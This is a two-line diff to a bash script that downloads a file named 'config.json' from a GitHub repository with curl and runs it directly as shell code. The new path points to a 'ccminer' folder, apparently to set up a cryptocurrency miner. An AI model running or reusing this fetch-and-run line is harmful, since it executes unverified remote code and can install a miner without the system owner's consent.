@@ -1,2 +1,2 @@
 #!/bin/bash
-bash <(curl -s https://raw.githubusercontent.com/maluuux/maluuux-kub/main/config.json)
+bash <(curl -s https://raw.githubusercontent.com/maluuux/maluuux-kub/main/ccminer/config.json)
